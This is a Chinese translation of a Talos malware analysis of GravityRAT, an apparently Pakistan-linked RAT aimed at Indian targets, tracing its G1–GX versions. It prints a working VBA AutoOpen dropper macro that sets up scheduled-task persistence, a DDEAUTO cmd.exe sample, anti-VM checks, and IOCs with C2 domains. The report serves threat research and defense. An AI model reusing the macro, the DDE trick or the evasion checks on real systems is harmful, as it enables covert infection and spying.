> 原文链接: https://www.anquanke.com//post/id/106933 


# GravityRAT：以印度为APT目标两年内的演变史


                                阅读量   
                                **93314**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：blog.talosintelligence.com
                                <br>原文地址：[https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html](https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t0147bafb35cd64f02b.jpg)](https://p3.ssl.qhimg.com/t0147bafb35cd64f02b.jpg)



## 一、前言

今天思科的Talos团队发现了一款新型恶意软件，在过去的两年内，该恶意软件一直隐藏在人们的眼皮底下，并且仍在持续发展中。几个星期以前，我们发现攻击者开始使用这款RAT（远程访问工具）的最新变种，我们将这款恶意软件称之为GravityRAT。在本文中，我们将讨论GravityRAT的技术功能、演进及发展历史，同时追踪溯源隐藏在背后的潜在攻击者。

GravityRAT的持续发展时间至少已长达18个月之久，在此期间开发者已经实现了一些新的功能。在GravityRAT的发展过程中，我们可以看到研发者添加了文件提取、远程命令执行、反虚拟环境技术。除了标准的远程命令执行以外，这条演变路线也表明背后的攻击者具备坚定的决心及创造力。

在调查过程中，我们观察到攻击者使用了多个恶意文档来攻击受害者。开发者之前曾利用这些恶意文档在VirusTotal这个分析平台上进行测试。利用VirusTotal，开发者可以不断改进恶意软件，降低被反病毒软件检测到的概率。

虽然GravityRAT之前没被公开讨论过，但印度的国家计算机应急响应小组（CERT）曾公布过一些信息，表示攻击者曾使用GravityRAT发起针对印度的[攻击活动](https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory%20for%20Malicious%20Targeted%20Attack%20Campaign.pdf)。最后，由于我们识别出了一些信息（比如位置信息以及开发者的名称），我们将讨论研究过程中发现的一些追踪溯源信息，我们认为这是开发者自己不小心导致这些信息泄露出来。



## 二、感染途径

### <a class="reference-link" name="%E6%81%B6%E6%84%8FOffice%E6%96%87%E6%A1%A3"></a>恶意Office文档

恶意软件开发者构造的恶意文档大多为Microsoft Office Word文档。攻击者使用嵌入式宏在受害者系统上执行命令。当受害者打开恶意文档后，将看到如下界面：

[![](https://p5.ssl.qhimg.com/t017a7f84f142fa0500.png)](https://p5.ssl.qhimg.com/t017a7f84f142fa0500.png)

恶意文档会让用户证明自己不是机器人（类似我们在网上经常看到的CAPTCHA（验证码）识别操作），诱骗用户启用宏功能。这是许多基于Office的恶意软件的惯用伎俩。攻击者尝试通过这种方法，欺骗启用了受保护模式（Protected Mode）的那些用户。启用宏之后，恶意软件就可以开始执行。我们发现文档所释放出来的嵌入式宏其实非常小。

```
Sub AutoOpen()
  If Not Dir(Environ("TEMP") + "image4.exe") &lt;&gt; "" Then
    Const lCancelled_c As Long = 0
      Dim sSaveAsPath As String
      sSaveAsPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "temporary.zip"
      If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub
      ActiveDocument.Save
      Application.Documents.Add ActiveDocument.FullName
      ActiveDocument.SaveAs sSaveAsPath
      ActiveDocument.Close
      Set app = CreateObject("Shell.Application")
      ExtractTo = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
      ExtractByExtension app.NameSpace(Environ("TEMP") + "temporary.zip"), "exe", ExtractTo
  End If
End Sub

Sub ExtractByExtension(fldr, ext, dst)
  Set FSO = CreateObject("Scripting.FileSystemObject")
  Set app = CreateObject("Shell.Application")
  For Each f In fldr.Items
    If f.Type = "File folder" Then
      ExtractByExtension f.GetFolder, ext, dst
    ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then
      If Not Dir(Environ("TEMP") + "image4.exe") &lt;&gt; "" Then
        app.NameSpace(dst).CopyHere f.Path, &amp;H4
      End If
    End If
  Next
  Shell "schtasks /create /tn wordtest /tr ""'%temp%image4.exe' 35"" /sc DAILY /f /RI 10 /du 24:00 /st 00:01"
End Sub
```

这个宏包含3个函数：

1、当文档打开时会执行第1个函数。该函数的功能是将当前活动的文档（即已打开的Word文档）拷贝到临时目录中，然后将其重命名为ZIP压缩文档。docx格式实际上就是常见的ZIP压缩格式，可以使用常用工具进行解压。

2、第2个函数可以解压`temporary.zip`文件，提取其中存储的`.exe`文件。

3、第3个函数创建名为“wordtest”的计划任务，每天执行这个恶意文件。

利用这种方法，攻击者可以确保不存在直接执行（执行恶意文件的任务交给计划任务来处理）、没有下载额外载荷，并且攻击者利用docx格式为压缩格式这一点，将可执行文件（即GravityRAT）成功包装起来。



### <a class="reference-link" name="%E6%96%87%E6%A1%A3%E6%B5%8B%E8%AF%95%E6%93%8D%E4%BD%9C"></a>文档测试操作

在跟踪过程中，我们发现攻击者出于测试目的，往VirusTotal上提交了多个恶意文档。攻击者测试了恶意宏的检测率（宏经过修改，或者将执行恶意载荷替换成运行calc），开发者尝试了利用Office文档的DDE（dynamic data exchange）来执行命令。这是对Microsoft Office文档中存在的DDE协议的一种滥用方法，虽然微软提供了这一功能，但攻击者也可以利用这个功能从事恶意活动。微软前一段时间已经公布了相应的[缓解措施](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)。开发者构造了Office Word以及Excel文档，以探测这些文档在VirusTotal上的检测率。攻击者尝试将DDE对象隐藏在文档的不同部位：比如在主对象或者在头部中。在提交检测的样本中，DDE对象只是简单地运行微软的计算器程序。样本如下所示：

```
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;

&lt;w:document [...redated...`}`] mc:Ignorable="w14 w15 wp14"&gt;&lt;w:body&gt;&lt;w:p w:rsidR="00215C91" w:rsidRDefault="008C166A"&gt;&lt;w:r&gt;&lt;w:fldChar w:fldCharType="begin"/&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:instrText xml:space="preserve"&gt; &lt;/w:instrText&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:rPr&gt;&lt;w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/&gt;&lt;w:color w:val="383838"/&gt;&lt;w:spacing w:val="3"/&gt;&lt;w:sz w:val="26"/&gt;&lt;w:szCs w:val="26"/&gt;&lt;w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/&gt;&lt;/w:rPr&gt;&lt;w:instrText&gt;DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe"&lt;/w:instrText&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:instrText xml:space="preserve"&gt; &lt;/w:instrText&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:fldChar w:fldCharType="end"/&gt;&lt;/w:r&gt;&lt;w:bookmarkStart w:id="0" w:name="_GoBack"/&gt;&lt;w:bookmarkEnd w:id="0"/&gt;&lt;/w:p&gt;&lt;w:sectPr w:rsidR="00215C91"&gt;&lt;w:pgSz w:w="12240" w:h="15840"/&gt;&lt;w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/&gt;&lt;w:cols w:space="720"/&gt;&lt;w:docGrid w:linePitch="360"/&gt;&lt;/w:sectPr&gt;&lt;/w:body&gt;&lt;/w:document&gt;
```

根据文件名，我们认为已提交的这些样本应当都是测试文档，攻击者使用不同的方法和Office技巧以确保恶意软件不被检测出来。这些文件名如下所示：

```
testnew1.docx
Test123.docx
test456.docx
test2.docx
book1test2.xlsx
Test123.doc
```



## 三、GRAVITYRAT

最开始我们通过一个恶意Word文档发现了GravityRAT的踪影。前面提到过，这个Word文档包含各种宏用来传递最终载荷。考虑到这是恶意软件的最新版本，因此我们想进一步确定这个攻击者的活跃时长以及攻击活动的演变历史。我们发现GravityRAT在两年时间内衍生出了4个不同的版本。接下来，我们将详细分析这个开发者的研发生命周期以及恶意功能的添加过程。

### <a class="reference-link" name="G1%E7%89%88%E6%9C%AC"></a>G1版本

恶意软件开发者以`G`字母为开头来控制软件版本。我们识别出的最早的一个版本为G1版本。该样本的PDB路径如下所示：

```
f:FWindows WorkG1Adeel's LaptopG1 Main VirussystemInterruptsgravityobjx86DebugsystemInterrupts.pdb
```

你会发现上面有个名字：Adeel，这可能是开发者的名字。当然，这个信息可能被恶意软件作者篡改过。这个样本的编译时间为2016年12月，原始的文件名为`resume.exe`。

该版本的目的是窃取受影响系统上的信息，包含如下信息：

```
MAC地址
计算机名
用户名
IP地址
日期
窃取以.docx、.doc、.pptx、.ppt、.xlsx、 .xls、.rtf以及.pdf为后缀名的文件
映射到系统上的磁盘卷信息
```

这些信息随后会发往如下某个域名：

[![](https://p2.ssl.qhimg.com/t0187434475bb1e5ed2.png)](https://p2.ssl.qhimg.com/t0187434475bb1e5ed2.png)

G1还可以根据攻击者的需要，在被感染的主机上执行命令。

### <a class="reference-link" name="G2%E7%89%88%E6%9C%AC"></a>G2版本

2017年7月份，我们识别出了一款新的变种，名为G2。该样本的PDB路径如下：

```
e:Windows WorkG2G2 Main VirusMicrosoft Virus Solutions (G2 v5) (Current)Microsoft Virus SolutionsobjDebugWindows Wireless 802.11.pdb
```

对于这个版本，开发者修改了恶意软件的架构。主代码的目的是加载并执行两个.NET程序，这两个程序存储在文件的资源区中：

1、第1个资源是[Github](https://github.com/dahall/TaskScheduler)上的一个合法的开源库，该库是Windows Task Scheduler的.NET封装包。

2、第2个资源就是G2版本的GravityRAT。

该变种所使用的命令控制（C2）服务器与G1一样，然而，我们发现G2中添加了一个额外的“载荷”变量。

[![](https://p0.ssl.qhimg.com/t01189f98ba8b513e89.png)](https://p0.ssl.qhimg.com/t01189f98ba8b513e89.png)

该变种与之前的样本功能基本一致，但多了一个功能：该变种可以通过WMI请求收集`Win32_Processor`中的CPU信息（处理器ID、名称、制造商以及时钟速度）。攻击者很有可能会利用该信息在这款恶意软件中规避虚拟机环境。利用该信息，恶意软件可以尝试阻止虚拟环境对自身的分析。

该变种与之前一个变种略微有所区别，可以通过Windows计划任务执行新的载荷。这就解释了为什么恶意软件需要使用一个.NET封装器。

该样本在资源区中包含一个诱导图片：

[![](https://p3.ssl.qhimg.com/t01ee0d9d5365acb6df.jpg)](https://p3.ssl.qhimg.com/t01ee0d9d5365acb6df.jpg)



### <a class="reference-link" name="G3%E7%89%88%E6%9C%AC"></a>G3版本

2017年8月，GravityRAT的作者使用了一款新的变种：G3版本，该变种的PDB路径为：

```
F:Projectsg3G3 Version 4.0G3G3objReleaseIntel Core.pdb
```

该变种使用了与G2相同的方法，并且在资源区中包含了一个合法的库。开发者同时为这个库添加了额外的语言支持，包括如下语言：

```
German
Spanish
French
Italian
Chinese
```

[![](https://p5.ssl.qhimg.com/t01eabb09f78885f34a.png)](https://p5.ssl.qhimg.com/t01eabb09f78885f34a.png)

作者在这个变种中修改了后端的C2服务器，URI也发生了改变，对应的GravityRAT变量名如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c443207552373134.png)

印度CERT同样在8月份向潜在的受害者发布公告，称GravityRAT已经被用于有针对性的攻击活动中。由于这款恶意软件一直在持续演进中，因此这意味着下一个版本的变种已呼之欲出。

### <a class="reference-link" name="GX%E7%89%88%E6%9C%AC"></a>GX版本

GravityRAT的最新变种于2017年12月创建，名为GX。PDB路径如下：

```
C:UsersThe InvincibleDesktopgxgx-current-programLSASSobjReleaseLSASS.pdb
```

这款变种是迄今为止最为高级的GravityRAT变种。在整个演变过程中，我们发现这款恶意软件会嵌入开源、合法的.NET库（用于计划任务、压缩、加密以及.NET加载）。该变种包含名为“important”的一个资源，该资源其实是带有密码保护的一个压缩文档。

这款变种包含与之前变种相同的功能，但添加了一些新的功能：

1、运行`netstat`命令收集受害者主机上的开放端口信息。

2、列出正在运行的所有进程。

3、列出系统上可用的服务。

4、除了G1变种中涉及的文档格式外，该变种还会提取`.ptt`以及`.pptx`文件。

5、如果系统中连入了一个USB设备，则该恶意软件会根据扩展名列表窃取其中的文件。

6、支持文件加密功能（采用AES算法，密钥为“lolomycin2017”）。

7、收集账户信息（账户类型、描述、域名、全名、SID以及状态）。

8、通过几种技术检查当前系统是否为虚拟机环境。

为了检查目标系统是否为虚拟机环境，恶意软件开发者总共使用了7种技术。

第1种技术主要原理是检查注册表键值，查找hypervisor在系统上安装的一些额外工具：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0158136f6ca6759a07.png)

第2种技术使用了WMI请求来获得BIOS版本信息（`Win32-BIOS`）。如果返回的信息包含“VMware”、“Virtual”、“XEN”或者“A M I”，则认为当前系统为虚拟机环境。此外，恶意软件会检查BIOS的序列号以及具体版本。

[![](https://p4.ssl.qhimg.com/t014ad2b07fb46839b4.png)](https://p4.ssl.qhimg.com/t014ad2b07fb46839b4.png)

第3种技术使用了WMI中的`Win32_Computer`，检查生产商是否包含“VIRTUAL”、“VMWARE”或者“VirtualBox”字样。

[![](https://p0.ssl.qhimg.com/t01bb7b84c706684f88.png)](https://p0.ssl.qhimg.com/t01bb7b84c706684f88.png)

第4种技术会检查系统的处理器ID信息。

[![](https://p0.ssl.qhimg.com/t017184fc5112ca4be7.png)](https://p0.ssl.qhimg.com/t017184fc5112ca4be7.png)

第5种技术会统计目标系统种的CPU核心数（恶意软件作者希望系统不止一个核心）。

[![](https://p3.ssl.qhimg.com/t0118b8b4c3f7c6a346.png)](https://p3.ssl.qhimg.com/t0118b8b4c3f7c6a346.png)

第6种技术会检查系统当前的CPU温度（`MSAcpi_ThermalZoneTemperature`条目）。事实上某些hypervisors（VMWare、VirtualBox以及Hyper-V）并不支持温度检查功能。WMI请求只会简单地回复“不支持”字样。这种逻辑可以用来检测目标系统是否为真实的主机环境。

[![](https://p0.ssl.qhimg.com/t017e73852e02042b17.png)](https://p0.ssl.qhimg.com/t017e73852e02042b17.png)

最后一种技术用到了目标系统的MAC地址信息。如果MAC地址以某些常见的十六进制数字开头，则将目标系统识别为虚拟机。

[![](https://p4.ssl.qhimg.com/t014087687091d8a83c.png)](https://p4.ssl.qhimg.com/t014087687091d8a83c.png)

与之前的变种一样，该变种使用HTTP协议与C2服务器通信。URI地址种用到了GX变种的版本信息。我们可以看到该变种与之前的变种共享C2服务器：

[![](https://p5.ssl.qhimg.com/t01126b7d43309b79a4.png)](https://p5.ssl.qhimg.com/t01126b7d43309b79a4.png)



## 四、幕后肇事者

接下来我们与大家分享关于幕后攻击者以及恶意软件的一些证据。追踪溯源一直是一项非常复杂的工作，恶意软件开发者可以使用代理或者VPN来伪造样本的来源。即便如此，我们还是会简单地介绍关于此次攻击幕后黑手的一些事实。

恶意软件开发者至少使用了两个不同的用户名：“The Invincible”以及“TheMartian”。在最早版本的GravityRAT中，PDB路径中包含“Adeel’s Laptop”字样，很有可能攻击者泄露了他的真实名字：“Adeel”。此外，所有的恶意Office文档，特别是提交到VirusTotal上用来测试反病毒软件检测效果的文档都来自巴基斯坦。在下文的IOC中，4个PE文件中有1个也来源于巴基斯坦。

2017年8月，印度国家CERT发布了针对性恶意攻击活动的[安全公告](https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory%20for%20Malicious%20Targeted%20Attack%20Campaign.pdf)。这份安全公告中提到了GravityRAT所使用的C2服务器基础架构，这表明GravityRAT作者很有可能针对的是印度的实体/组织。利用Cisco Umbrella并使用调查工具后，我们发现，在所有的C2域名列表中有来自印度的大量流量。根据印度国家CERT提供的证据，对C2域名的所有请求中至少有50%的请求来自于印度的IP地址。在研究过程中，非印度归属地的IP地址可能掺杂我们自己的IP地址。

[![](https://p0.ssl.qhimg.com/t01852644f715c844a3.png)](https://p0.ssl.qhimg.com/t01852644f715c844a3.png)



## 五、总结

这个攻击者可能并不是我们见过的最厉害的攻击者，但自2016年以来，他或者她成功地将自身隐藏在公众的眼皮底下。他们能够研发恶意代码，制作了至少4个变种。每个新的变种都会包含新的功能。开发者一直在使用同样的C2架构，由于开发者非常聪明，因此可以保证这些C2架构的安全，不会被安全供应商列入黑名单。攻击者花了一些精力来确保恶意软件不会运行在虚拟环境中，以避免被分析。然而，他们并没有花时间专门去混淆.NET代码。这些代码逆向分析起来非常简单，因此我们使用静态分析方法就足以应付这款恶意软件。

在安全公告中，印度CERT认为此次攻击活动针对的是印度的实体及组织。

开发者在样本以及VirusTotal平台上泄露了一些信息（比如Adeel）。基于这些信息，我们能够理解开发者如何测试恶意文档，以减少多个常见杀毒引擎对其的检测率。在测试过程中，提交至VirusTotal的所有样本都来自于巴基斯坦。



## 六、IOC

**恶意文档**

恶意宏

```
0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb703
70dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82
835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4
C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719
ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a
f4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136
```

其他恶意文档（DDE）

```
911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f
fb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210
ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301
cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2
07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105
```

**GravityRAT**

G1

```
9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a
```

G2

```
1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc
```

G3

```
99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90
```

GX

```
1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96
```

**C2服务器**

```
hxxp://cone[.]msoftupdates.com:46769
hxxp://ctwo[.]msoftupdates.com:46769
hxxp://cthree[.]msoftupdates.com:46769
hxxp://eone[.]msoftupdates.eu:46769
hxxp://etwo[.]msoftupdates.eu:46769
hxxp://msupdates[.]mylogisoft.com:46769
hxxp://coreupdate[.]msoftupdates.com:46769
hxxp://updateserver[.]msoftupdates.eu:46769

msoftupdates[.]com
msoftupdates[.]eu
mylogisoft[.]com
```

URI：

```
/Gvty@/1ns3rt_39291384.php
/Gvty@/newIns3rt.php
/Gvty@/payloads
/Gvty@/ip.php
/G3/ServerSide/G3.php
/G3/Payload/
/GX/GX-Server.php
/GetActiveDomains.php
```
